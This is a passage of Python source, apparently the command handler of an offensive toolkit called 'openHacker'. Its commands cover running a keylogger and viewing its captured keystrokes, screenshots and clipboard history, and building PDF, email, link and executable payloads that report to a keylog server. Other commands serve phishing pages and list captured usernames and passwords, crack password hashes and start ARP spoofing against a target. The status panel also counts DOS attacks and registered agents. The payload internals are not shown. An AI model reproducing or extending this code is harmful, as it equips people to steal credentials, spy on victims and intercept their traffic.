        status = "🟢 Running" if self.keylogger.running else "🔴 Stopped"
        return {'success': True, 'output': f"Keylogger Status: {status}"}
    
    def _keylogger_logs(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        limit = int(args[0]) if args else 20
        logs = self.keylogger.get_keylogs(limit)
        if not logs:
            return {'success': True, 'output': 'No keylogs found'}
        output = f"Keylogger Logs ({len(logs)}):\n"
        for log in logs:
            output += f"\n[{log.get('timestamp', '')[:19]}]\n{log.get('text', '')[:200]}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_screenshots(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        screenshots = self.keylogger.get_screenshots()
        if not screenshots:
            return {'success': True, 'output': 'No screenshots captured'}
        output = "Screenshots:\n"
        for s in screenshots:
            output += f"  • {s}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_clipboard(self, args: List[str]) -> Dict:
        limit = int(args[0]) if args else 20
        clipboard = self.db.get_clipboard_history(limit)
        if not clipboard:
            return {'success': True, 'output': 'No clipboard history'}
        output = "Clipboard History:\n"
        for c in clipboard:
            output += f"  [{c['timestamp'][:19]}] {c['content'][:100]}\n"
        return {'success': True, 'output': output}
    
    # ==================== Deployment Commands ====================
    def _deploy_pdf(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: deploy_pdf <name> <target> <keylog_url>'}
        name = args[0]
        target = args[1]
        keylog_url = args[2]
        deployment = self.deployment.create_pdf_payload(name, target, keylog_url)
        return {
            'success': True,
            'output': f"PDF deployment created: {deployment.id}\nFile: {deployment.payload}",
            'data': {'id': deployment.id, 'path': deployment.payload}
        }
    
    def _deploy_email(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 5:
            return {'success': False, 'output': 'Usage: deploy_email <name> <target> <subject> <body> <keylog_url>'}
        name = args[0]
        target = args[1]
        subject = args[2]
        body = args[3]
        keylog_url = args[4]
        deployment = self.deployment.create_email_payload(name, target, subject, body, keylog_url)
        return {
            'success': True,
            'output': f"Email deployment created: {deployment.id}\nFile: {deployment.payload}",
            'data': {'id': deployment.id, 'path': deployment.payload}
        }
    
    def _deploy_link(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: deploy_link <name> <target> <keylog_url>'}
        name = args[0]
        target = args[1]
        keylog_url = args[2]
        deployment = self.deployment.create_link_payload(name, target, keylog_url)
        return {
            'success': True,
            'output': f"Link deployment created: {deployment.id}\nURL: {deployment.payload}",
            'data': {'id': deployment.id, 'url': deployment.payload}
        }
    
    def _deploy_executable(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: deploy_executable <name> <target> <keylog_server>'}
        name = args[0]
        target = args[1]
        keylog_server = args[2]
        deployment = self.deployment.create_executable_payload(name, target, keylog_server)
        return {
            'success': True,
            'output': f"Executable deployment created: {deployment.id}\nFile: {deployment.payload}",
            'data': {'id': deployment.id, 'path': deployment.payload}
        }
    
    def _deploy_list(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        deployments = self.deployment.get_deployments()
        if not deployments:
            return {'success': True, 'output': 'No deployments found'}
        output = "Deployments:\n"
        for d in deployments:
            status = "📄" if d['delivered'] else "⏳"
            output += f"  {status} {d['id']} - {d['name']} ({d['type']})\n"
            output += f"     Target: {d['target']}\n"
            output += f"     Opened: {d['opened']}, Executed: {d['executed']}\n"
        return {'success': True, 'output': output}
    
    def _deploy_track(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: deploy_track <deployment_id>'}
        deployment_id = args[0]
        self.deployment.track_opened(deployment_id)
        return {'success': True, 'output': f"Tracked open for deployment {deployment_id}"}
    
    # ==================== Domain Hosting Commands ====================
    def _ip_to_domain(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: ip_to_domain <ip>'}
        ip = args[0]
        try:
            domain = self.domain_hosting.translate_ip_to_domain(ip)
            if domain:
                return {'success': True, 'output': f"Domain for IP {ip}: {domain}"}
            return {'success': False, 'output': f"No domain found for IP {ip}"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _domain_to_ip(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: domain_to_ip <domain>'}
        domain = args[0]
        try:
            ip = self.domain_hosting.translate_domain_to_ip(domain)
            if ip:
                return {'success': True, 'output': f"IP for domain {domain}: {ip}"}
            return {'success': False, 'output': f"No IP found for domain {domain}"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _host_domain(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: host_domain <ip> <domain> [port]'}
        ip = args[0]
        domain = args[1]
        port = int(args[2]) if len(args) > 2 else 8080
        
        try:
            domain_host = self.domain_hosting.host_domain(ip, domain, port)
            if domain_host:
                return {
                    'success': True,
                    'output': f"Domain {domain} hosted on IP {ip}:{port}\nID: {domain_host.id}\nPath: {domain_host.hosting_path}"
                }
            return {'success': False, 'output': f"Failed to host domain {domain}"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _host_website(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: host_website <domain> <html_file>'}
        domain = args[0]
        html_file = args[1]
        
        try:
            with open(html_file, 'r') as f:
                html_content = f.read()
            success = self.domain_hosting.host_website(domain, html_content)
            if success:
                return {'success': True, 'output': f"Website hosted on http://{domain}"}
            return {'success': False, 'output': f"Failed to host website on {domain}"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _list_domains(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        try:
            domains = self.domain_hosting.list_hosted_domains()
            if not domains:
                return {'success': True, 'output': 'No hosted domains'}
            output = "Hosted Domains:\n"
            for d in domains:
                status = "🟢 Active" if d['active'] else "🔴 Inactive"
                output += f"  • {d['domain']} -> {d['ip']} ({status})\n"
            return {'success': True, 'output': output}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _domain_info(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: domain_info <domain>'}
        domain = args[0]
        try:
            domains = self.domain_hosting.list_hosted_domains()
            for d in domains:
                if d['domain'] == domain:
                    return {'success': True, 'output': json.dumps(d, indent=2)}
            return {'success': False, 'output': f"Domain {domain} not found"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    # ==================== Social Engineering ====================
    def _phish(self, platform: str) -> Dict:
        result = self.social.generate_phishing_link(platform)
        if result['success']:
            output = f"🎣 Phishing link generated for {platform}\n"
            output += f"Link ID: {result['link_id']}\n"
            output += f"\nTo start server: phish_start {result['link_id']}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': 'Failed to generate phishing link'}
    
    def _phish_start(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: phish_start <link_id> [port]'}
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        if self.social.start_server(link_id, port):
            url = self.social.phishing_server.get_url()
            return {'success': True, 'output': f"🎣 Phishing server started on {url}"}
        return {'success': False, 'output': f"Failed to start server for link {link_id}"}
    
    def _phish_stop(self, args: List[str]) -> Dict:
        self.social.stop_server()
        return {'success': True, 'output': 'Phishing server stopped'}
    
    def _phish_creds(self, args: List[str]) -> Dict:
        link_id = args[0] if args else None
        creds = self.social.get_captured_credentials(link_id)
        if not creds:
            return {'success': True, 'output': 'No captured credentials'}
        output = f"📧 Captured Credentials ({len(creds)}):\n"
        for c in creds[:10]:
            output += f"  • {c['timestamp'][:19]} - {c['username']}:{c['password']} from {c['ip_address']}\n"
        return {'success': True, 'output': output}
    
    # ==================== Cracking Commands ====================
    def _crack(self, args: List[str]) -> Dict:
        if not self.cracking:
            return {'success': False, 'output': 'Cracking engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: crack <hash_type> <hash_value> [wordlist]'}
        hash_type = args[0]
        hash_value = args[1]
        wordlist = args[2] if len(args) > 2 else None
        
        job_id = self.cracking.crack_hash(hash_type, hash_value, wordlist)
        return {
            'success': True,
            'output': f"🔓 Cracking job started: {job_id}\nHash type: {hash_type}\nHash: {hash_value[:20]}...\nUse 'crack_status {job_id}' to check progress"
        }
    
    def _crack_status(self, args: List[str]) -> Dict:
        if not self.cracking:
            return {'success': False, 'output': 'Cracking engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: crack_status <job_id>'}
        job_id = args[0]
        job = self.cracking.get_job_status(job_id)
        if not job:
            return {'success': False, 'output': f'Job {job_id} not found'}
        
        output = f"🔓 Cracking Job Status: {job_id}\n"
        output += f"  Type: {job.get('hash_type')}\n"
        output += f"  Status: {job.get('status')}\n"
        if job.get('result'):
            output += f"  Result: {job.get('result')}\n"
        if job.get('cracked'):
            output += "  ✅ Cracked!\n"
        return {'success': True, 'output': output}
    
    def _crack_list(self, args: List[str]) -> Dict:
        if not self.cracking:
            return {'success': False, 'output': 'Cracking engine not initialized'}
        jobs = self.cracking.get_all_jobs()
        if not jobs:
            return {'success': True, 'output': 'No cracking jobs found'}
        output = "🔓 Cracking Jobs:\n"
        for job in jobs:
            status = "✅" if job.get('cracked') else "🔄" if job.get('status') == 'running' else "⏳"
            output += f"  {status} {job.get('job_id')} - {job.get('hash_type')} ({job.get('status')})\n"
        return {'success': True, 'output': output}
    
    def _crack_md5(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_md5 <hash> [wordlist]'}
        return self._crack(['md5'] + args)
    
    def _crack_sha1(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_sha1 <hash> [wordlist]'}
        return self._crack(['sha1'] + args)
    
    def _crack_sha256(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_sha256 <hash> [wordlist]'}
        return self._crack(['sha256'] + args)
    
    def _crack_ntlm(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_ntlm <hash> [wordlist]'}
        return self._crack(['ntlm'] + args)
    
    # ==================== ARP Spoofing Commands ====================
    def _arp_spoof(self, args: List[str]) -> Dict:
        if not self.arp_spoofing:
            return {'success': False, 'output': 'ARP spoofing engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: arp_spoof <target_ip> <gateway_ip> [interface]'}
        target_ip = args[0]
        gateway_ip = args[1]
        interface = args[2] if len(args) > 2 else None
        
        result = self.arp_spoofing.start_spoof(target_ip, gateway_ip, interface)
        if result.status == "running":
            return {'success': True, 'output': f"🕸️ ARP spoofing started\nTarget: {target_ip}\nGateway: {gateway_ip}\nInterface: {result.interface}"}
        return {'success': False, 'output': f"Failed to start ARP spoofing"}
    
    def _arp_stop(self, args: List[str]) -> Dict:
        if not self.arp_spoofing:
            return {'success': False, 'output': 'ARP spoofing engine not initialized'}
        spoof_id = args[0] if args else None
        if self.arp_spoofing.stop_spoof(spoof_id):
            return {'success': True, 'output': 'ARP spoofing stopped' + (f' ({spoof_id})' if spoof_id else '')}
        return {'success': False, 'output': 'Failed to stop ARP spoofing'}
    
    def _arp_status(self, args: List[str]) -> Dict:
        if not self.arp_spoofing:
            return {'success': False, 'output': 'ARP spoofing engine not initialized'}
        active = self.arp_spoofing.get_active_spoofs()
        if not active:
            return {'success': True, 'output': 'No active ARP spoofing'}
        output = "🕸️ Active ARP Spoofs:\n"
        for s in active:
            output += f"  • {s['target_ip']} -> {s['gateway_ip']} ({s['interface']}) - {s['status']}\n"
        return {'success': True, 'output': output}
    
    def _arp_history(self, args: List[str]) -> Dict:
        if not self.arp_spoofing:
            return {'success': False, 'output': 'ARP spoofing engine not initialized'}
        limit = int(args[0]) if args else 20
        history = self.arp_spoofing.get_spoof_history(limit)
        if not history:
            return {'success': True, 'output': 'No ARP spoofing history'}
        output = "📋 ARP Spoofing History:\n"
        for h in history:
            output += f"  • {h['target_ip']} -> {h['gateway_ip']} - {h['status']} ({h['packets_sent']} packets)\n"
        return {'success': True, 'output': output}
    
    def _arp_scan(self, args: List[str]) -> Dict:
        if not self.arp_spoofing:
            return {'success': False, 'output': 'ARP spoofing engine not initialized'}
        result = self._generic('arp -a')
        return result
    
    # ==================== MAC Commands ====================
    def _mac_info(self, args: List[str]) -> Dict:
        if not self.mac_manager:
            return {'success': False, 'output': 'MAC manager not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: mac_info <mac_address>'}
        mac = args[0]
        info = self.mac_manager.get_mac_info(mac)
        output = f"📡 MAC Information:\n"
        output += f"  MAC Address: {info.get('mac_address', 'Unknown')}\n"
        output += f"  Vendor: {info.get('vendor', 'Unknown')}\n"
        output += f"  IP Address: {info.get('ip_address', 'Unknown')}\n"
        output += f"  Hostname: {info.get('hostname', 'Unknown')}\n"
        output += f"  First Seen: {info.get('first_seen', 'Unknown')}\n"
        output += f"  Last Seen: {info.get('last_seen', 'Unknown')}"
        return {'success': True, 'output': output}
    
    def _mac_scan(self, args: List[str]) -> Dict:
        if not self.mac_manager:
            return {'success': False, 'output': 'MAC manager not initialized'}
        network = args[0] if args else None
        results = self.mac_manager.scan_network(network)
        if not results:
            return {'success': True, 'output': 'No devices found'}
        output = "📡 Network MAC Scan Results:\n"
        for r in results:
            output += f"  • {r['ip_address']} - {r['mac_address']} ({r['vendor']})\n"
        return {'success': True, 'output': output}
    
    def _mac_vendor(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: mac_vendor <mac_address>'}
        mac = args[0]
        vendor = self.tools.get_mac_vendor(mac)
        if vendor:
            return {'success': True, 'output': f"Vendor for {mac}: {vendor}"}
        return {'success': False, 'output': f"Could not determine vendor for {mac}"}
    
    def _mac_lookup(self, args: List[str]) -> Dict:
        return self._mac_vendor(args)
    
    # ==================== NAT Commands ====================
    def _nat_info(self, args: List[str]) -> Dict:
        if not self.nat_info:
            return {'success': False, 'output': 'NAT info engine not initialized'}
        info = self.nat_info.get_nat_info()
        output = f"🌐 NAT Information:\n"
        output += f"  Public IP: {info.public_ip}\n"
        output += f"  Private IP: {info.private_ip}\n"
        output += f"  Router IP: {info.router_ip}\n"
        output += f"  Country: {info.country}\n"
        output += f"  ISP: {info.isp}\n"
        output += f"  NAT Type: {info.nat_type}"
        return {'success': True, 'output': output}
    
    def _nat_public(self, args: List[str]) -> Dict:
        if not self.nat_info:
            return {'success': False, 'output': 'NAT info engine not initialized'}
        info = self.nat_info.get_nat_info()
        return {'success': True, 'output': f"Public IP: {info.public_ip}"}
    
    def _nat_private(self, args: List[str]) -> Dict:
        if not self.nat_info:
            return {'success': False, 'output': 'NAT info engine not initialized'}
        info = self.nat_info.get_nat_info()
        return {'success': True, 'output': f"Private IP: {info.private_ip}"}
    
    def _nat_router(self, args: List[str]) -> Dict:
        if not self.nat_info:
            return {'success': False, 'output': 'NAT info engine not initialized'}
        info = self.nat_info.get_nat_info()
        return {'success': True, 'output': f"Router IP: {info.router_ip}"}
    
    # ==================== Docker Commands ====================
    def _docker_scan(self, args: List[str]) -> Dict:
        if not self.docker_scanner:
            return {'success': False, 'output': 'Docker scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: docker_scan <image>'}
        image = args[0]
        result = self.docker_scanner.scan_image(image)
        if result['success']:
            output = f"🐳 Docker scan of {image} completed\n"
            output += f"  Severity: {result.get('severity', 'unknown')}\n"
            output += f"  Vulnerabilities: {len(result.get('vulnerabilities', []))}\n"
            for v in result.get('vulnerabilities', [])[:5]:
                output += f"  • {v.get('description', '')[:100]}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': result.get('error', 'Scan failed')}
    
    def _docker_info(self, args: List[str]) -> Dict:
        if not self.docker_scanner:
            return {'success': False, 'output': 'Docker scanner not initialized'}
        result = self.docker_scanner.docker_info()
        return {'success': result['success'], 'output': result['output']}
    
    def _docker_ps(self, args: List[str]) -> Dict:
        if not self.docker_scanner:
            return {'success': False, 'output': 'Docker scanner not initialized'}
        result = self.docker_scanner.docker_ps()
        return {'success': result['success'], 'output': result['output']}
    
    def _docker_images(self, args: List[str]) -> Dict:
        if not self.docker_scanner:
            return {'success': False, 'output': 'Docker scanner not initialized'}
        result = self.docker_scanner.docker_images()
        return {'success': result['success'], 'output': result['output']}
    
    def _docker_bench(self, args: List[str]) -> Dict:
        if not self.docker_scanner:
            return {'success': False, 'output': 'Docker scanner not initialized'}
        result = self.docker_scanner.docker_bench()
        return {'success': result['success'], 'output': result['output']}
    
    # ==================== Email Commands ====================
    def _email_compose(self, args: List[str]) -> Dict:
        if not self.email_composer:
            return {'success': False, 'output': 'Email composer not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: email_compose <to> <subject> <body> [html]'}
        to = args[0]
        subject = args[1]
        body = ' '.join(args[2:]) if len(args) > 2 else ''
        html = len(args) > 3 and args[3].lower() == 'html'
        
        email_msg = self.email_composer.compose_email(to, subject, body, html=html)
        return {
            'success': True,
            'output': f"📧 Email composed\nTo: {to}\nSubject: {subject}\nUse 'email_list' to see draft, then 'email_send <id>' to send"
        }
    
    def _email_send(self, args: List[str]) -> Dict:
        if not self.email_composer:
            return {'success': False, 'output': 'Email composer not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: email_send <email_id>'}
        email_id = int(args[0])
        result = self.email_composer.send_email(email_id)
        if result['success']:
            return {'success': True, 'output': f"📧 Email sent successfully: {result['message']}"}
        return {'success': False, 'output': f"Failed to send email: {result.get('error', 'Unknown error')}"}
    
    def _email_list(self, args: List[str]) -> Dict:
        if not self.email_composer:
            return {'success': False, 'output': 'Email composer not initialized'}
        status = args[0] if args and args[0] in ['draft', 'sent', 'failed'] else None
        emails = self.email_composer.get_emails(status, 20)
        if not emails:
            return {'success': True, 'output': 'No emails found'}
        output = "📧 Emails:\n"
        for e in emails:
            output += f"  • ID: {e['id']} - To: {e['to_address']} - Subject: {e['subject'][:30]} - Status: {e['status']}\n"
        return {'success': True, 'output': output}
    
    def _email_delete(self, args: List[str]) -> Dict:
        if not self.email_composer:
            return {'success': False, 'output': 'Email composer not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: email_delete <email_id>'}
        email_id = int(args[0])
        if self.email_composer.delete_email(email_id):
            return {'success': True, 'output': f"Email {email_id} deleted"}
        return {'success': False, 'output': f"Failed to delete email {email_id}"}
    
    # ==================== PDF Report Commands ====================
    def _report_generate(self, args: List[str]) -> Dict:
        if not self.pdf_report:
            return {'success': False, 'output': 'PDF report generator not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: report_generate <title> <target>'}
        title = args[0]
        target = args[1]
        
        analysis = {
            'target': target,
            'timestamp': datetime.datetime.now().isoformat(),
            'scan_results': {},
            'recommendations': [
                'Review all open ports and close unnecessary services',
                'Update all software to latest versions',
                'Implement network segmentation',
                'Enable logging and monitoring on all critical systems'
            ]
        }
        
        result = self.pdf_report.generate_report(title, target, analysis)
        if result['success']:
            return {'success': True, 'output': f"📊 PDF Report generated: {result['file_path']}"}
        return {'success': False, 'output': f"Failed to generate report: {result.get('error', 'Unknown error')}"}
    
    def _report_list(self, args: List[str]) -> Dict:
        if not self.pdf_report:
            return {'success': False, 'output': 'PDF report generator not initialized'}
        reports = self.pdf_report.get_reports(20)
        if not reports:
            return {'success': True, 'output': 'No reports found'}
        output = "📊 PDF Reports:\n"
        for r in reports:
            output += f"  • {r['title']} - {r['target']} - {r['created_at'][:19]}\n"
        return {'success': True, 'output': output}
    
    # ==================== Threat Monitor Commands ====================
    def _monitor_start(self, args: List[str]) -> Dict:
        if not self.threat_monitor:
            return {'success': False, 'output': 'Threat monitor not initialized'}
        self.threat_monitor.start()
        return {'success': True, 'output': 'Threat monitoring started'}
    
    def _monitor_stop(self, args: List[str]) -> Dict:
        if not self.threat_monitor:
            return {'success': False, 'output': 'Threat monitor not initialized'}
        self.threat_monitor.stop()
        return {'success': True, 'output': 'Threat monitoring stopped'}
    
    def _monitor_add(self, args: List[str]) -> Dict:
        if not self.threat_monitor:
            return {'success': False, 'output': 'Threat monitor not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: monitor_add <target> <scan_type> [interval]'}
        target = args[0]
        scan_type = args[1]
        interval = int(args[2]) if len(args) > 2 else 300
        success = self.threat_monitor.add_monitor(target, scan_type, interval)
        if success:
            return {'success': True, 'output': f"Monitor added for {target} ({scan_type}) every {interval}s"}
        return {'success': False, 'output': 'Failed to add monitor'}
    
    def _monitor_status(self, args: List[str]) -> Dict:
        if not self.threat_monitor:
            return {'success': False, 'output': 'Threat monitor not initialized'}
        status = self.threat_monitor.get_status()
        output = f"📊 Threat Monitor Status:\n"
        output += f"  Running: {status['running']}\n"
        output += f"  Monitors: {status['monitors_count']}\n"
        output += f"  Active: {status['active_monitors']}\n"
        output += f"  Last Report: {status['last_report'] or 'Never'}\n"
        return {'success': True, 'output': output}
    
    def _monitor_list(self, args: List[str]) -> Dict:
        if not self.threat_monitor:
            return {'success': False, 'output': 'Threat monitor not initialized'}
        monitors = self.db.get_threat_monitors(enabled_only=False)
        if not monitors:
            return {'success': True, 'output': 'No monitors configured'}
        output = "📊 Threat Monitors:\n"
        for m in monitors:
            status = "🟢" if m.get('enabled') else "🔴"
            output += f"  {status} {m['target']} - {m['scan_type']} (every {m['interval']}s)\n"
            output += f"     Last scan: {m.get('last_scan', 'Never')[:19] if m.get('last_scan') else 'Never'}\n"
        return {'success': True, 'output': output}
    
    def _monitor_report(self, args: List[str]) -> Dict:
        if not self.threat_monitor:
            return {'success': False, 'output': 'Threat monitor not initialized'}
        self.threat_monitor._generate_report()
        return {'success': True, 'output': 'Threat report generation initiated'}
    
    # ==================== Scan Commands ====================
    def _scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _quick_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: quick_scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _full_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: full_scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'full')
        return {'success': result.success, 'output': result.output}
    
    # ==================== IP Management ====================
    def _add_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: add_ip <ip> [notes]'}
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else ''
        
        domain = self.tools.ip_to_domain(ip)
        
        try:
            ipaddress.ip_address(ip)
            if self.db.add_managed_ip(ip, domain, 'cli', notes):
                return {'success': True, 'output': f'✅ IP {ip} added to monitoring (Domain: {domain or "Unknown"})'}
            return {'success': False, 'output': f'Failed to add IP {ip}'}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _remove_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: remove_ip <ip>'}
        ip = args[0]
        ips = self.db.get_managed_ips()
        if any(i['ip_address'] == ip for i in ips):
            self.db.conn.execute("DELETE FROM managed_ips WHERE ip_address = ?", (ip,))
            self.db.conn.commit()
            return {'success': True, 'output': f'✅ IP {ip} removed'}
        return {'success': False, 'output': f'IP {ip} not found'}
    
    def _block_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: block_ip <ip> [reason]'}
        ip = args[0]
        reason = ' '.join(args[1:]) if len(args) > 1 else 'Manually blocked'
        firewall_success = self.tools.block_ip(ip)
        db_success = self.db.block_ip(ip, reason, 'cli')
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔒 IP {ip} blocked: {reason}'}
        return {'success': False, 'output': f'Failed to block IP {ip}'}
    
    def _unblock_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: unblock_ip <ip>'}
        ip = args[0]
        firewall_success = self.tools.unblock_ip(ip)
        db_success = self.db.unblock_ip(ip)
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔓 IP {ip} unblocked'}
        return {'success': False, 'output': f'Failed to unblock IP {ip}'}
    
    def _list_ips(self, args: List[str]) -> Dict:
        include_blocked = not (args and args[0].lower() == 'active')
        ips = self.db.get_managed_ips(include_blocked)
        if not ips:
            return {'success': True, 'output': 'No managed IPs'}
        output = "📋 Managed IPs:\n"
        for ip in ips:
            status = "🔒" if ip['is_blocked'] else "🟢"
            domain = ip.get('domain', 'Unknown')
            output += f"  {status} {ip['ip_address']} ({domain}) - {ip.get('notes', '')}\n"
        return {'success': True, 'output': output}
    
    def _ip_info(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ip_info <ip>'}
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            db_info = self.db.conn.execute(
                "SELECT * FROM managed_ips WHERE ip_address = ?", (ip,)
            ).fetchone()
            location = self.tools.location(ip)
            domain = self.tools.ip_to_domain(ip)
            
            output = f"🔍 IP Information: {ip}\n{'='*40}\n"
            if domain:
                output += f"🌐 Domain: {domain}\n"
            if db_info:
                output += f"📊 Status: {'🔒 Blocked' if db_info['is_blocked'] else '🟢 Active'}\n"
                output += f"📅 Added: {db_info['added_date'][:10]}\n"
                output += f"📝 Notes: {db_info['notes'] or 'None'}\n"
            if location.get('success'):
                output += f"📍 Location: {location.get('country')}, {location.get('city')}\n"
                output += f"📡 ISP: {location.get('isp')}\n"
            return {'success': True, 'output': output}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _analyze_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: analyze_ip <ip>'}
        ip = args[0]
        
        ping_result = self.tools.ping(ip, 4)
        location = self.tools.location(ip)
        nmap_result = self.tools.nmap(ip, 'quick')
        domain = self.tools.ip_to_domain(ip)
        
        output = f"🐙 openHacker IP Analysis Report for {ip}\n"
        output += "=" * 50 + "\n\n"
        
        if domain:
            output += f"🌐 Domain: {domain}\n\n"
        
        output += "📡 Ping Results:\n"
        output += ping_result.output[:500] + "\n\n"
        
        if location.get('success'):
            output += "📍 Geolocation:\n"
            output += f"  Country: {location.get('country')}\n"
            output += f"  City: {location.get('city')}\n"
            output += f"  ISP: {location.get('isp')}\n\n"
        
        output += "🔍 Port Scan Results:\n"
        output += nmap_result.output[:1000] + "\n\n"
        
        db_info = self.db.conn.execute(
            "SELECT * FROM managed_ips WHERE ip_address = ?", (ip,)
        ).fetchone()
        
        output += "🛡️ Security Status:\n"
        if db_info and db_info['is_blocked']:
            output += "  Status: 🔒 Blocked\n"
            output += f"  Reason: {db_info['block_reason']}\n"
        else:
            output += "  Status: 🟢 Not Blocked\n"
        
        output += "\n💡 Recommendations:\n"
        if ping_result.success and ping_result.output:
            output += "  • Target is reachable\n"
        else:
            output += "  • Target may be down or blocking ICMP\n"
        
        if 'open' in nmap_result.output:
            output += "  • Open ports detected - review security\n"
        
        return {'success': True, 'output': output}
    
    # ==================== System Commands ====================
    def _status(self, args: List[str]) -> Dict:
        stats = self.db.get_statistics()
        output = f"""
🐙 openHacker System Status
{'='*40}
📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  Domain Hosts: {stats.get('total_domain_hosts', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Keylog Entries: {stats.get('total_keylogs', 0)}
  DOS Attacks: {stats.get('total_dos_attacks', 0)}
  Registered Agents: {stats.get('total_agents', 0)}
  Deployments: {stats.get('total_deployments', 0)}
  Cracking Jobs: {stats.get('total_cracking_jobs', 0)}
  ARP Spoofs: {stats.get('total_arp_spoofs', 0)}
  MAC Entries: {stats.get('total_mac_entries', 0)}
  NAT Entries: {stats.get('total_nat_entries', 0)}
  Emails: {stats.get('total_emails', 0)}
  PDF Reports: {stats.get('total_pdf_reports', 0)}
  Monitors: {stats.get('total_monitors', 0)}

💻 System Info:
  Platform: {platform.system()} {platform.release()}
  Hostname: {socket.gethostname()}
  Local IP: {self.tools.get_local_ip()}
  CPU: {psutil.cpu_percent()}%
  Memory: {psutil.virtual_memory().percent}%
  Disk: {psutil.disk_usage('/').percent}%
"""
        return {'success': True, 'output': output}
    
    def _history(self, args: List[str]) -> Dict:
        limit = 20
        if args and args[0].isdigit():
            limit = int(args[0])
        history = self.db.conn.execute(
            "SELECT command, source, timestamp, success FROM command_history ORDER BY timestamp DESC LIMIT ?",
            (limit,)
        ).fetchall()
